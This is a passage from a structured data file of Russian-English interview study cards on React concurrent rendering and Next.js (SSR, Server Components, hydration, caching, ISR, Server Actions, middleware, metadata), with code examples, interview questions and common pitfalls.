            "В синхронном (legacy) режиме любое обновление состояния рендерится полностью и сразу, блокируя основной поток до завершения — если это обновление затрагивает тяжёлое дерево компонентов, ввод пользователя (нажатие клавиши, клик) будет ощущаться 'подвисшим' до конца этого рендера. Concurrent-режим (включается через createRoot вместо устаревшего ReactDOM.render) даёт React возможность работать над рендером 'в фоне', не коммитя изменения в DOM немедленно, и явно расставлять приоритеты: срочные обновления (прямой ответ на ввод пользователя) обрабатываются немедленно, а низкоприоритетные (например, обновление результатов поиска по мере ввода) могут быть прерваны и пересчитаны заново, если пользователь продолжил печатать. Важно, что concurrent rendering — это в первую очередь возможность, включаемая инфраструктурой (createRoot) и явно используемая через API вроде useTransition/useDeferredValue/Suspense, а не автоматическое поведение, которое магически ускоряет весь существующий код без каких-либо изменений.",
          codeExample:
            "import { createRoot } from 'react-dom/client';\n\nconst root = createRoot(document.getElementById('root')); // включает concurrent features\nroot.render(<App />);\n\n// Само по себе не меняет поведение существующего кода —\n// concurrent-возможности используются явно через useTransition, useDeferredValue, Suspense.",
          interviewQuestion: "Означает ли включение concurrent-режима (createRoot), что весь существующий код автоматически станет быстрее?",
          interviewAnswerRu:
            "Нет — сам по себе переход на createRoot не меняет поведение существующего кода 'магически': он лишь открывает React доступ к возможности прерывать и приоритизировать рендер. Реальный выигрыш появляется только тогда, когда разработчик явно помечает конкретные обновления как низкоприоритетные через useTransition или useDeferredValue, либо использует Suspense для параллельной, не блокирующей друг друга загрузки разных частей интерфейса — без этих явных изменений в коде рендер продолжает вести себя так же, как и в синхронном режиме.",
          interviewAnswerEn:
            "No — switching to createRoot alone doesn't 'magically' change existing code's behavior: it merely gives React the ability to interrupt and prioritize rendering. The real benefit only shows up when a developer explicitly marks specific updates as low-priority via useTransition or useDeferredValue, or uses Suspense to load different parts of the UI in parallel without blocking each other — without those explicit code changes, rendering continues to behave the same as in synchronous mode.",
          pitfalls: [
            "Ожидать автоматического прироста производительности только от смены ReactDOM.render на createRoot без использования конкретных concurrent-API.",
            "Путать concurrent rendering с многопоточностью — React по-прежнему выполняется в одном потоке JS, просто по-другому планирует порядок и приоритет работы внутри него.",
          ],
        },
      },
      {
        id: "react-usetransition",
        title: "useTransition",
        content: {
          title: "useTransition",
          shortExplanation:
            "useTransition помечает конкретное обновление состояния как 'некритичное' (transition) — React может отложить или прервать его рендер ради более срочных обновлений (например, реакции на следующее нажатие клавиши), сохраняя интерфейс отзывчивым.",
          detailedExplanation:
            "Хук возвращает пару [isPending, startTransition]: startTransition оборачивает вызов setState, который логически 'может подождать' (например, обновление большого списка результатов поиска), а isPending — булево значение, которое становится true, пока это отложенное обновление ещё не применено, и его удобно использовать для показа лёгкого индикатора загрузки без блокировки остального интерфейса. Ключевое отличие от простого дебаунса: транзиция не откладывает выполнение по времени искусственно — она позволяет React начать рендерить обновление немедленно в фоне, но при поступлении более срочного обновления (нового нажатия клавиши) прервать недорендеренную транзицию и начать заново с актуальными данными, вместо того чтобы просто ждать фиксированную паузу. Срочные обновления (например, само значение инпута, за которым нужно, чтобы курсор и текст не 'запаздывали') оставляют вне startTransition, а более тяжёлые производные от них — оборачивают в транзицию.",
          codeExample:
            "function SearchPage() {\n  const [query, setQuery] = useState('');\n  const [results, setResults] = useState([]);\n  const [isPending, startTransition] = useTransition();\n\n  function handleChange(e) {\n    setQuery(e.target.value); // срочно — инпут должен реагировать мгновенно\n    startTransition(() => {\n      setResults(computeSearchResults(e.target.value)); // может подождать/прерваться\n    });\n  }\n\n  return (\n    <>\n      <input value={query} onChange={handleChange} />\n      {isPending && <Spinner />}\n      <ResultsList results={results} />\n    </>\n  );\n}",
          interviewQuestion: "Чем useTransition принципиально отличается от обычного debounce для того же сценария поиска?",
          interviewAnswerRu:
            "Debounce искусственно откладывает вызов функции на фиксированное время после того, как события перестали поступать — то есть жертвует задержкой ради снижения частоты вызовов, независимо от реальной загруженности системы. useTransition не добавляет искусственной задержки: React пытается отрендерить обновление немедленно в фоновом приоритете, и только если во время этого рендера приходит более срочное обновление, прерывает недорендеренную работу и начинает заново — то есть при отсутствии конкурирующих срочных обновлений результат появится настолько быстро, насколько это возможно, а не всегда через фиксированный интервал debounce.",
          interviewAnswerEn:
            "Debounce artificially delays a function call by a fixed amount of time after events stop coming in — trading latency for a lower call rate, regardless of how busy the system actually is. useTransition adds no artificial delay: React tries to render the update immediately at a background priority, and only interrupts unfinished work and restarts if a more urgent update comes in during that render — meaning that when there's no competing urgent update, the result appears as fast as possible, rather than always after a fixed debounce interval.",
          pitfalls: [
            "Оборачивать в startTransition обновление, от которого пользователь ждёт мгновенной обратной связи (например, само значение текстового поля) — это создаёт ощущение задержки ввода.",
            "Путать useTransition с useDeferredValue — первый оборачивает вызов setState, второй работает с уже существующим значением, откладывая его использование в тяжёлой части дерева.",
          ],
        },
      },
      {
        id: "react-usedeferredvalue",
        title: "useDeferredValue",
        content: {
          title: "useDeferredValue",
          shortExplanation:
            "useDeferredValue возвращает 'отложенную' копию значения, которая на короткое время может отставать от актуального во время интенсивного обновления, позволяя React в первую очередь отрендерить срочные части интерфейса, а тяжёлые — с небольшой задержкой.",
          detailedExplanation:
            "В отличие от useTransition, который оборачивает конкретный вызов setState в компоненте, где значение производится, useDeferredValue применяется в компоненте, который это значение потребляет, и не требует контроля над тем, откуда оно приходит (это удобно, если значение приходит как проп извне, а не из локального useState). React рендерит компонент с отложенным значением дважды за одно логическое обновление: сначала со старым (пока быстрым) значением, чтобы не блокировать срочный ввод, а затем, в фоне, с новым значением — если во время этого фонового рендера пользователь снова изменит ввод, недорендеренная попытка прерывается и начинается заново с самым свежим значением. Значение из useDeferredValue стоит сравнивать с предыдущим (через сравнение ссылок), чтобы, например, показывать визуальную индикацию 'устаревших' результатов (сниженная непрозрачность), пока фоновый рендер с актуальным значением ещё не завершён.",
          codeExample:
            "function SearchResults({ query }) {\n  const deferredQuery = useDeferredValue(query); // может на мгновение отставать от query\n  const isStale = query !== deferredQuery;\n\n  return (\n    <div style={{ opacity: isStale ? 0.6 : 1 }}>\n      <ExpensiveList query={deferredQuery} /> {/* тяжёлый рендер использует отложенное значение */}\n    </div>\n  );\n}",
          interviewQuestion: "В чём разница между useDeferredValue и обычным debounce того же значения?",
          interviewAnswerRu:
            "Debounce искусственно ждёт фиксированный интервал после последнего изменения значения, прежде чем передать его дальше — задержка предсказуема и одинакова независимо от того, насколько мощное устройство у пользователя. useDeferredValue не привязан к фиксированному времени: React обновляет отложенное значение настолько быстро, насколько позволяет текущая загрузка рендера, — на мощном устройстве или при лёгком дереве компонентов задержка может быть почти незаметной, а на медленном устройстве или при тяжёлом рендере — более заметной, потому что механизм привязан к реальной приоритизации рендера, а не к произвольно выбранному числу миллисекунд.",
          interviewAnswerEn:
            "Debounce artificially waits a fixed interval after the last value change before passing it along — the delay is predictable and the same regardless of how powerful the user's device is. useDeferredValue isn't tied to a fixed time: React updates the deferred value as fast as the current render workload allows — on a powerful device or with a light component tree the lag can be nearly imperceptible, while on a slow device or with a heavy render it can be more noticeable, because the mechanism is tied to actual render prioritization rather than an arbitrarily chosen number of milliseconds.",
          pitfalls: [
            "Ожидать от useDeferredValue предсказуемой фиксированной задержки, как у debounce, — реальная задержка зависит от загруженности рендера и не гарантирована.",
            "Использовать useDeferredValue там, где значение производится в том же компоненте и удобнее было бы просто использовать useTransition вокруг setState.",
          ],
        },
      },

    ],
  },


  // ---------------------------------------------------------------------
  // NEXT.JS / SSR
  // ---------------------------------------------------------------------
  {
    id: "nextjs-ssr",
    title: "Next.js / SSR",
    subtopics: [
      {
        id: "nextjs-ssr-basics",
        title: "SSR",
        content: {
          title: "SSR (Server-Side Rendering)",
          shortExplanation:
            "SSR — это рендеринг React-компонентов в HTML на сервере при каждом запросе, а не только в браузере.",
          detailedExplanation:
            "При SSR сервер выполняет React-код, генерирует готовый HTML и отправляет его браузеру, который сразу показывает контент без 'пустого экрана'. После загрузки JS на клиенте происходит гидрация (hydration) — React 'подключается' к уже существующему HTML, добавляя интерактивность. SSR улучшает первый рендер (First Contentful Paint) и SEO, но добавляет нагрузку на сервер и требует, чтобы данные для страницы были доступны на момент запроса.",
          codeExample:
            "// app/products/[id]/page.tsx — Server Component по умолчанию в Next.js\nexport default async function ProductPage({ params }: { params: { id: string } }) {\n  const product = await fetchProduct(params.id); // выполняется на сервере\n  return <h1>{product.title}</h1>;\n}",
          interviewQuestion: "В чём разница между SSR и CSR (Client-Side Rendering)?",
          interviewAnswerRu:
            "При CSR браузер сначала получает почти пустой HTML и минимальный JS-бандл, а весь рендеринг и запросы данных происходят уже в браузере — пользователь какое-то время видит пустой экран или спиннер. При SSR сервер уже отдаёт готовый HTML с контентом, поэтому первый экран появляется быстрее, а интерактивность 'догоняет' через гидрацию.",
          interviewAnswerEn:
            "With CSR the browser first receives an almost empty HTML shell and a minimal JS bundle, and all rendering and data fetching happen in the browser afterward — so the user sees a blank screen or spinner for a while. With SSR the server already sends fully rendered HTML, so the first paint appears faster, and interactivity catches up via hydration.",
          pitfalls: [
            "Думать, что SSR автоматически решает все проблемы производительности — при плохой архитектуре сервер может стать узким местом.",
            "Забывать, что SSR-страница не интерактивна до завершения гидрации на клиенте.",
          ],
          practiceTask:
            "Сравните Network-вкладку в DevTools для одной и той же страницы, отрендеренной через SSR и через чистый CSR (например, через 'use client' страницу с useEffect + fetch).",
          resources: {
            docs: [
              { title: "Server and Client Components — Next.js Docs", url: "https://nextjs.org/docs/app/getting-started/server-and-client-components" },
            ],
            articles: [
              { title: "Making Sense of React Server Components (Josh Comeau)", url: "https://www.joshwcomeau.com/react/server-components/" },
            ],
          },
        },
      },
      {
        id: "nextjs-server-components",
        title: "Server Components",
        content: {
          title: "Server Components",
          shortExplanation:
            "Server Components — компоненты, которые выполняются только на сервере, не попадают в JS-бандл клиента и могут напрямую обращаться к данным.",
          detailedExplanation:
            "В Next.js App Router все компоненты по умолчанию являются Server Components, если явно не указано 'use client'. Они могут быть async, напрямую делать запросы к БД или внешним API без создания отдельного API-эндпоинта, и их код (включая используемые тяжёлые библиотеки) не отправляется в браузер — это уменьшает размер клиентского бандла. Ограничение: Server Components не могут использовать хуки состояния (useState, useEffect) и браузерные API, потому что они не выполняются в браузере.",
          codeExample:
            "// Это Server Component: без 'use client', может быть async\nexport default async function Page() {\n  const data = await db.posts.findMany(); // прямой доступ к БД\n  return <PostList posts={data} />;\n}",
          interviewQuestion: "Почему Server Components уменьшают размер JS-бандла на клиенте?",
          interviewAnswerRu:
            "Потому что код Server Component выполняется исключительно на сервере: React рендерит его в специальный сериализованный формат (RSC payload) и отправляет клиенту уже готовый результат, а не исходный JS-код компонента и его зависимостей. Если компонент использует тяжёлую библиотеку только для форматирования данных на сервере, эта библиотека вообще не попадёт в браузер.",
          interviewAnswerEn:
            "Because a Server Component's code runs exclusively on the server: React renders it into a special serialized format (the RSC payload) and sends the client the already-computed result, not the component's source code and its dependencies. If a component uses a heavy library only to format data server-side, that library never ships to the browser at all.",
          pitfalls: [
            "Пытаться использовать useState/useEffect в Server Component — это ошибка компиляции.",
            "Не понимать, что 'use client' в файле делает клиентским весь его поддерево импортов по умолчанию (если явно не разделить компоненты).",
          ],
          practiceTask:
            "Создайте страницу-Server Component, которая делает fetch данных 'на сервере', и дочерний интерактивный компонент с 'use client' внутри неё, передавая данные как пропсы.",
          resources: {
            docs: [
              { title: "Server and Client Components — Next.js Docs", url: "https://nextjs.org/docs/app/getting-started/server-and-client-components" },
            ],
            articles: [
              { title: "Server Components — React Docs", url: "https://react.dev/reference/rsc/server-components" },
              { title: "Making Sense of React Server Components (Josh Comeau)", url: "https://www.joshwcomeau.com/react/server-components/" },
            ],
          },
        },
      },
      {
        id: "nextjs-client-components",
        title: "Client Components",
        content: {
          title: "Client Components",
          shortExplanation:
            "Client Components — компоненты с директивой 'use client' наверху файла, которые выполняются в браузере и могут использовать state, эффекты и события.",
          detailedExplanation:
            "Client Component нужен там, где требуется интерактивность: обработчики событий (onClick, onChange), состояние (useState, useReducer), эффекты (useEffect), браузерные API (window, localStorage) или сторонние библиотеки, рассчитанные на клиентское выполнение (например, большинство UI-библиотек с состоянием). 'use client' — это граница: она помечает не только сам файл, но и всё, что он импортирует, как часть клиентского бандла.",
          codeExample:
            "'use client';\n\nimport { useState } from 'react';\n\nexport function Counter() {\n  const [count, setCount] = useState(0);\n  return <button onClick={() => setCount(c => c + 1)}>{count}</button>;\n}",
          interviewQuestion: "Как правильно комбинировать Server и Client Components, чтобы не 'утяжелять' клиента?",
          interviewAnswerRu:
            "Общий принцип — 'use client' ставить как можно ниже по дереву, только на реально интерактивных листовых компонентах, а не на верхнеуровневых страницах или layout. Данные лучше грузить в Server Component и передавать их как пропсы в маленький интерактивный Client Component, а не тянуть весь layout в клиентский рендеринг.",
          interviewAnswerEn:
            "The general rule is to put 'use client' as low in the tree as possible — only on the actually interactive leaf components, not on top-level pages or layouts. Data should be fetched in a Server Component and passed as props into a small interactive Client Component, rather than pulling the entire layout into client-side rendering.",
          pitfalls: [
            "Ставить 'use client' в самом верху дерева 'на всякий случай', превращая всё приложение в CSR.",
            "Передавать в Client Component функции или данные, которые не сериализуются (например, экземпляры классов из БД).",
          ],
          practiceTask:
            "Возьмите страницу из предыдущего примера и вынесите интерактивную кнопку 'Добавить в избранное' в отдельный маленький Client Component, оставив остальную страницу серверной.",
          resources: {
            docs: [
              { title: "Server and Client Components — Next.js Docs", url: "https://nextjs.org/docs/app/getting-started/server-and-client-components" },
            ],
            articles: [
              { title: "Making Sense of React Server Components (Josh Comeau)", url: "https://www.joshwcomeau.com/react/server-components/" },
            ],
          },
        },
      },
      {
        id: "nextjs-hydration",
        title: "Hydration",
        content: {
          title: "Hydration (гидрация)",
          shortExplanation:
            "Hydration — процесс, в котором React 'оживляет' уже отрендеренный на сервере HTML, добавляя обработчики событий и внутреннее состояние.",
          detailedExplanation:
            "После того как браузер получил готовый HTML от SSR, он загружает JS-бандл React, который повторно 'рендерит' то же дерево компонентов, но не создаёт новые DOM-узлы, а привязывается к уже существующим и навешивает на них обработчики событий. Если результат рендера на клиенте не совпадает с тем, что было на сервере (например, из-за использования Date.now() или window напрямую в рендере), возникает hydration mismatch — предупреждение или ошибка о несовпадении разметки.",
          codeExample:
            "// Плохо: разное значение на сервере и клиенте -> hydration mismatch\nfunction Clock() {\n  return <span>{new Date().toLocaleTimeString()}</span>;\n}\n\n// Лучше: показываем реальное время только после монтирования на клиенте\nfunction Clock() {\n  const [time, setTime] = useState<string | null>(null);\n  useEffect(() => setTime(new Date().toLocaleTimeString()), []);\n  return <span>{time ?? '--:--:--'}</span>;\n}",
          interviewQuestion: "Что такое hydration mismatch и почему он возникает?",
          interviewAnswerRu:
            "Hydration mismatch — это ситуация, когда HTML, сгенерированный React на сервере, не совпадает с тем, что React рендерит при гидрации на клиенте. Частые причины: использование Date.now(), Math.random(), window/localStorage прямо в теле рендера, различия в данных или локали между сервером и клиентом. React в этом случае либо выводит предупреждение и использует клиентскую версию, либо (в серьёзных случаях) ломает интерактивность части дерева.",
          interviewAnswerEn:
            "A hydration mismatch happens when the HTML React generated on the server doesn't match what React renders during hydration on the client. Common causes: calling Date.now(), Math.random(), or accessing window/localStorage directly in the render body, or differences in data or locale between server and client. React either warns and falls back to the client-rendered version, or in worse cases breaks interactivity for part of the tree.",
          pitfalls: [
            "Использовать данные, зависящие от времени/рандома/браузера, прямо в рендере серверного компонента.",
            "Игнорировать предупреждения о hydration mismatch в консоли — они указывают на реальный баг.",
          ],
          practiceTask:
            "Специально вызовите hydration mismatch (например, через new Date() в рендере) и изучите предупреждение в консоли браузера, затем исправьте его через useEffect.",
          resources: {
            docs: [
              { title: "hydrateRoot — React Docs", url: "https://react.dev/reference/react-dom/client/hydrateRoot" },
            ],
            articles: [
              { title: "Server and Client Components (hydration explained) — Next.js Docs", url: "https://nextjs.org/docs/app/getting-started/server-and-client-components" },
            ],
          },
        },
      },
      {
        id: "nextjs-caching",
        title: "Next.js Caching",
        content: {
          title: "Next.js Caching",
          shortExplanation:
            "Next.js кэширует данные и рендер на нескольких уровнях (fetch cache, Full Route Cache, Router Cache), чтобы не пересчитывать одно и то же при каждом запросе.",
          detailedExplanation:
            "В App Router есть несколько независимых слоёв кэша: Data Cache — кэш результатов fetch() на сервере (можно управлять через опции cache и revalidate); Full Route Cache — кэш отрендеренного HTML/RSC-payload для статических маршрутов; Router Cache — кэш на стороне клиента для уже посещённых маршрутов, чтобы навигация между ними была мгновенной. Каждый слой можно настраивать и инвалидировать отдельно, что даёт гибкость, но требует понимания, какой именно кэш 'мешает' увидеть свежие данные.",
          codeExample:
            "// Кэшировать бессрочно (по умолчанию для fetch в Server Component)\nawait fetch(url);\n\n// Ревалидировать раз в 60 секунд (ISR-подобное поведение)\nawait fetch(url, { next: { revalidate: 60 } });\n\n// Никогда не кэшировать — всегда свежие данные\nawait fetch(url, { cache: 'no-store' });",
          interviewQuestion: "Почему обновлённые данные в БД иногда не сразу видны на странице Next.js?",
          interviewAnswerRu:
            "Скорее всего сработал один из слоёв кэша: fetch с cache: 'force-cache' (значение по умолчанию) отдал закэшированный ответ, либо сработал Full Route Cache для статически сгенерированной страницы. Решение — задать revalidate (по времени или через revalidatePath/revalidateTag после изменения данных), либо явно указать cache: 'no-store' там, где данные должны быть всегда свежими.",
          interviewAnswerEn:
            "Most likely one of the caching layers kicked in: a fetch with the default cache: 'force-cache' returned a cached response, or the Full Route Cache served a statically generated page. The fix is to set a revalidate window (time-based, or via revalidatePath/revalidateTag right after the data changes), or explicitly use cache: 'no-store' where the data must always be fresh.",
          pitfalls: [
            "Не понимать, что fetch в Next.js кэшируется по умолчанию иначе, чем обычный fetch в браузере.",
            "Забывать вызвать revalidatePath/revalidateTag после мутации данных на сервере (например, в Server Action).",
          ],
          practiceTask:
            "Сделайте страницу с fetch(url, { next: { revalidate: 10 } }) и понаблюдайте, как часто обновляются данные при повторных заходах с интервалом больше и меньше 10 секунд.",
          resources: {
            docs: [
              { title: "Caching — Next.js Docs", url: "https://nextjs.org/docs/app/getting-started/caching" },
            ],
            articles: [
              { title: "Fetching, Caching and Revalidating — Next.js Docs", url: "https://nextjs.org/docs/app/getting-started/fetching-data" },
            ],
          },
        },
      },
      {
        id: "nextjs-csr-ssg-isr",
        title: "CSR vs SSG vs ISR",
        content: {
          title: "CSR vs SSG vs ISR",
          shortExplanation:
            "CSR рендерит страницу целиком в браузере после загрузки JS; SSG генерирует статический HTML один раз во время сборки; ISR — гибрид: статический HTML, как у SSG, но с возможностью периодически перегенерироваться без полной пересборки всего сайта.",
          detailedExplanation:
            "CSR (Client-Side Rendering) отдаёт браузеру почти пустой HTML и весь JS-бандл, а реальный контент появляется только после загрузки и выполнения JS — это даёт максимальную интерактивность после загрузки, но худший из четырёх подходов LCP и SEO без дополнительных мер (поисковые роботы должны уметь выполнять JS, что не всегда надёжно). SSG (Static Site Generation) генерирует HTML для каждой страницы один раз, во время сборки (build time) — результат можно раздавать через CDN мгновенно, без обращения к серверу или базе данных вообще, что даёт лучшую производительность и SEO, но данные фиксируются на момент сборки и не обновляются без новой сборки всего сайта. ISR (Incremental Static Regeneration) решает эту негибкость: страница остаётся статической (как SSG), но помечается временем ревалидации (revalidate: 60) — после истечения этого времени первый же запрос к странице отдаёт старую закешированную версию (без задержки для пользователя), а в фоне Next.js перегенерирует страницу заново, и все последующие запросы получают уже обновлённую версию — то есть не нужно пересобирать весь сайт ради обновления одной страницы с редко меняющимися данными.",
          codeExample:
            "// SSG (App Router): статическая генерация по умолчанию для страницы без динамических данных\nexport default async function ProductPage({ params }) {\n  const product = await getProduct(params.id);\n  return <ProductView product={product} />;\n}\n\n// ISR: страница регенерируется в фоне не чаще раза в 60 секунд\nexport const revalidate = 60;\n\n// CSR: явно клиентский компонент, рендерящий данные после монтирования\n'use client';\nfunction LiveDashboard() {\n  const { data } = useSWR('/api/stats', fetcher); // рендер после загрузки JS в браузере\n}",
          whereUsed:
            "CSR — для сильно интерактивных приватных экранов (админки, дашборды за логином), где SEO не важен. SSG — для контента, который меняется редко (маркетинговые страницы, документация, блог). ISR — для контента, который меняется, но не мгновенно (каталог товаров, новостная лента), где нужен баланс между свежестью данных и производительностью статики.",
          interviewQuestion: "Чем ISR отличается от простого SSG с коротким временем кеширования на уровне CDN?",
          interviewAnswerRu:
            "Обычное кеширование на уровне CDN просто отдаёт статический ответ, пока не истёк TTL, а после истечения — блокирует запрос до получения нового ответа с origin-сервера (пользователь ждёт). ISR устроен иначе: после истечения revalidate первый запрос всё равно мгновенно получает старую (пусть уже устаревшую) статическую версию страницы без ожидания, а регенерация происходит асинхронно в фоне — пользователь, попавший на страницу именно в этот момент, никогда не видит задержку из-за регенерации, он либо получает старую версию, либо (при следующих заходах) уже обновлённую.",
          interviewAnswerEn:
            "Plain CDN-level caching just serves the static response until the TTL expires, and once it does, blocks the next request until a fresh response comes back from the origin server (the user waits). ISR works differently: once revalidate expires, the first request still instantly gets the old (now stale) static version with no wait, and regeneration happens asynchronously in the background — a user hitting the page at that exact moment never experiences a delay from regeneration; they either get the old version or, on a later visit, the already-updated one.",
          pitfalls: [
            "Использовать CSR для страниц, где важно SEO и быстрый первый рендер (лендинги, публичный каталог) — контент недоступен поисковым роботам до выполнения JS.",
            "Ставить слишком короткий revalidate для ISR на страницах с дорогой генерацией — это фактически превращает ISR в SSR по нагрузке на сервер, не давая реальной экономии.",
          ],
        },
      },
      {
        id: "nextjs-route-handlers-server-actions",
        title: "Route Handlers & Server Actions",
        content: {
          title: "Route Handlers & Server Actions",
          shortExplanation:
            "Route Handlers (файл route.ts внутри app/) — способ создать классический REST-подобный API-эндпоинт внутри Next.js; Server Actions — функции, помеченные 'use server', которые можно вызывать прямо из клиентского кода (включая сабмит формы) как обычную асинхронную функцию, без ручного создания отдельного эндпоинта и fetch к нему.",
          detailedExplanation:
            "Route Handler — это файл route.ts с экспортированными функциями GET/POST/PUT/DELETE, обрабатывающими HTTP-запросы к конкретному пути — по сути, обычный backend-эндпоинт, живущий прямо в структуре Next.js-приложения, полезный для полноценного REST API, вебхуков, интеграций со сторонними сервисами. Server Action — принципиально другая модель: функция с директивой 'use server' компилируется в скрытый эндпоинт автоматически, и её можно передать напрямую в атрибут action формы (<form action={createUser}>) или вызвать из клиентского компонента как обычную асинхронную функцию — Next.js сам сериализует аргументы, делает сетевой запрос под капотом и десериализует результат, избавляя от необходимости вручную писать fetch и API route для каждой простой мутации. Server Actions особенно удобны для форм, потому что работают даже без включённого на клиенте JavaScript (форма реально отправляется как обычный HTML-submit, если JS ещё не загружен) — это прогрессивное улучшение, которое Route Handlers сами по себе не дают.",
          codeExample:
            "// Route Handler — app/api/users/route.ts\nexport async function GET(request: Request) {\n  const users = await db.user.findMany();\n  return Response.json(users);\n}\n\n// Server Action — вызывается напрямую из формы, без ручного fetch\n'use server';\nasync function createUser(formData: FormData) {\n  await db.user.create({ data: { name: formData.get('name') } });\n}\n\n// В клиентском компоненте:\n// <form action={createUser}><input name=\"name\" /></form>",
          whereUsed:
            "Route Handlers — для полноценных REST-эндпоинтов, вебхуков от внешних сервисов (Stripe, GitHub), интеграций, которые дергают сторонние клиенты. Server Actions — для мутаций, инициированных формами и пользовательскими действиями внутри самого приложения (создание/обновление записи, лайк, добавление в корзину).",
          interviewQuestion: "В чём принципиальное отличие Server Action от обычного Route Handler + fetch с клиента?",
          interviewAnswerRu:
            "Route Handler требует ручной работы на обеих сторонах: нужно явно создать эндпоинт (route.ts), а на клиенте — написать fetch к этому URL, сериализовать тело запроса и обработать ответ. Server Action убирает эту ручную прослойку: функция с 'use server' сама становится вызываемой как обычная асинхронная функция прямо из клиентского кода или атрибута action формы, а Next.js берёт на себя сериализацию аргументов и сетевой вызов под капотом. Дополнительное отличие — Server Action, привязанный к form action, работает как прогрессивное улучшение и отправляется даже без JavaScript на странице, чего обычный fetch-вызов с клиента обеспечить не может.",
          interviewAnswerEn:
            "A Route Handler requires manual work on both sides: you have to explicitly create an endpoint (route.ts), and on the client, write a fetch call to that URL, serialize the request body, and handle the response. A Server Action removes that manual layer: a function marked 'use server' becomes directly callable as a regular async function from client code or a form's action attribute, and Next.js handles argument serialization and the network call under the hood. An additional distinction is that a Server Action tied to a form's action works as progressive enhancement and submits even without JavaScript on the page, which a plain client-side fetch call can't provide.",
          pitfalls: [
            "Использовать Server Action там, где на самом деле нужен полноценный публичный REST-эндпоинт для внешних потребителей — Server Actions не предназначены как стабильный публичный API-контракт.",
            "Забывать, что код внутри 'use server' выполняется на сервере и имеет доступ к секретам/БД — не валидировать входные данные так же строго, как обычный публичный API.",
          ],
        },
      },
      {
        id: "nextjs-middleware",
        title: "Middleware",
        content: {
          title: "Middleware",
          shortExplanation:
            "Middleware в Next.js — код (файл middleware.ts в корне проекта), который выполняется до того, как запрос дойдёт до конкретной страницы или Route Handler, и может перенаправить, переписать URL, добавить заголовки или заблокировать запрос.",
          detailedExplanation:
            "Middleware выполняется на edge-рантайме (облегчённая среда выполнения, ближе к пользователю географически, с более узким набором доступных Node.js API) и срабатывает для всех запросов, соответствующих указанному matcher — это делает его подходящим местом для сквозной логики, применяемой сразу ко многим маршрутам: проверка авторизации перед доступом к защищённым страницам (редирект на /login, если нет валидного токена в cookie), A/B-тестирование (переписывание URL на другой вариант страницы для части пользователей), локализация (редирект на нужный языковой префикс на основе заголовка Accept-Language), добавление security-заголовков ко всем ответам. Важное ограничение: middleware не должен выполнять тяжёлую логику (обращения к базе данных, сложные вычисления) — он добавляет задержку к каждому запросу, к которому применяется, и урезанный edge-рантайм не поддерживает часть обычных Node.js API (нет полного доступа к файловой системе, некоторым нативным модулям).",
          codeExample:
            "import { NextResponse } from 'next/server';\nimport type { NextRequest } from 'next/server';\n\nexport function middleware(request: NextRequest) {\n  const token = request.cookies.get('session')?.value;\n  if (!token && request.nextUrl.pathname.startsWith('/dashboard')) {\n    return NextResponse.redirect(new URL('/login', request.url));\n  }\n  return NextResponse.next();\n}\n\nexport const config = { matcher: ['/dashboard/:path*'] };",
          whereUsed:
            "Проверка авторизации перед защищёнными разделами, редиректы по геолокации/языку, A/B-тестирование через переписывание URL, добавление security-заголовков (CSP, X-Frame-Options) ко всем ответам сразу.",
          interviewQuestion: "Почему middleware не подходит для тяжёлой бизнес-логики вроде запроса к базе данных?",
          interviewAnswerRu:
            "Middleware выполняется на каждый подходящий под matcher запрос, на облегчённом edge-рантайме, оптимизированном под низкую задержку, а не под тяжёлые вычисления или полный набор Node.js API. Если внутри middleware сделать запрос к базе данных, эта задержка добавится к каждому запросу без исключения (включая статические ассеты, если matcher настроен неаккуратно), что ухудшает время ответа для всего затронутого трафика — тяжёлую логику лучше делать в самом Route Handler или Server Component, где она выполняется один раз для конкретной страницы, а не на пути каждого запроса.",
          interviewAnswerEn:
            "Middleware runs for every request matching its matcher, on a lightweight edge runtime optimized for low latency, not for heavy computation or the full set of Node.js APIs. If middleware makes a database call, that latency gets added to every single matched request (including static assets, if the matcher isn't configured carefully), degrading response time for all affected traffic — heavy logic is better placed in the actual Route Handler or Server Component, where it runs once for that specific page rather than on every request's path.",
          pitfalls: [
            "Настраивать matcher слишком широко (например, захватывая статические ассеты) и добавлять ненужную задержку ко всему трафику сайта.",
            "Пытаться использовать в middleware Node.js API, недоступные в edge-рантайме, и получать неожиданную ошибку сборки или рантайма.",
          ],
        },
      },
      {
        id: "nextjs-metadata-seo",
        title: "Metadata API & SEO",
        content: {
          title: "Metadata API & SEO",
          shortExplanation:
            "Metadata API в App Router — декларативный способ задать title, description, Open Graph и другие SEO-теги страницы через экспортируемый объект metadata (статический) или функцию generateMetadata (динамический, зависящий от данных страницы), вместо ручной вставки тегов в <head>.",
          detailedExplanation:
            "Для статических страниц (лендинг, страница 'О нас') достаточно экспортировать объект export const metadata = { title: '...', description: '...' } — Next.js сам вставит соответствующие теги в <head>. Для динамических страниц, где title/description зависят от загружаемых данных (страница товара, где title должен содержать название конкретного товара), используется export async function generateMetadata({ params }) — асинхронная функция, которая может дождаться загрузки данных и построить metadata на их основе, причём Next.js достаточно умён, чтобы не делать один и тот же запрос данных дважды, если и generateMetadata, и сам компонент страницы запрашивают одни и те же данные (React дедуплицирует одинаковые fetch-запросы в рамках одного рендера сервера). Помимо title/description, Metadata API поддерживает Open Graph и Twitter Card теги (для превью при шаринге в соцсетях/мессенджерах), canonical URL (важно для страниц с дублирующимся контентом по разным URL) и robots-директивы (управление индексацией конкретной страницы).",
          codeExample:
            "// Динамический metadata для страницы товара\nexport async function generateMetadata({ params }) {\n  const product = await getProduct(params.id); // тот же fetch, что и в самой странице — не дублируется\n  return {\n    title: `${product.name} — Купить в интернет-магазине`,\n    description: product.shortDescription,\n    openGraph: { images: [product.imageUrl] },\n  };\n}\n\nexport default async function ProductPage({ params }) {\n  const product = await getProduct(params.id); // React дедуплицирует этот запрос с тем, что выше\n  return <ProductView product={product} />;\n}",
          whereUsed:
            "Любые публично индексируемые страницы (каталог, статьи блога, лендинги), где важны позиции в поиске и корректные превью при шаринге ссылок в соцсетях и мессенджерах.",
          interviewQuestion: "Почему generateMetadata может безопасно делать тот же fetch-запрос, что и сам компонент страницы, не создавая двойную нагрузку?",
          interviewAnswerRu:
            "React (начиная с версии, используемой в современном Next.js App Router) автоматически дедуплицирует одинаковые вызовы fetch с одинаковыми аргументами в рамках одного серверного рендера — если и generateMetadata, и сама функция страницы вызывают fetch к одному и тому же URL, реальный сетевой запрос выполнится только один раз, а оба места получат один и тот же результат из общего кеша запроса на время этого конкретного рендера. Это снимает необходимость вручную придумывать, как 'передать' уже загруженные данные из одной функции в другую.",
          interviewAnswerEn:
